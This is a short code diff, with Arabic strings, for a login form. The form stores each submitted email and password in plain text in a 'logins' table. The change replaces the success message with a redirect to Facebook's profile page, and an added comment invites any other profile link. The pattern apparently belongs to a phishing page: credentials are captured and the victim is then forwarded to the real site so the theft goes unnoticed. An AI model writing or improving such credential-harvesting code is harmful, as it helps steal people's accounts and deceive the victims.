@@ -15,11 +15,11 @@ document.getElementById('loginForm').addEventListener('submit', async function (
     .from('logins')
     .insert([{ email, password }]);
 
-  if (error) {
-    alert('حدث خطأ أثناء حفظ البيانات');
-    console.error(error);
-  } else {
-    alert('تم حفظ بياناتك بنجاح!');
-    document.getElementById('loginForm').reset();
-  }
+ if (error) {
+  alert('حدث خطأ أثناء حفظ البيانات');
+  console.error(error);
+} else {
+  // ✅ حفظ البيانات تم بنجاح
+  window.location.href = "https://www.facebook.com/me"; // ← أو أي رابط ملف شخصي تريده
+}
 });
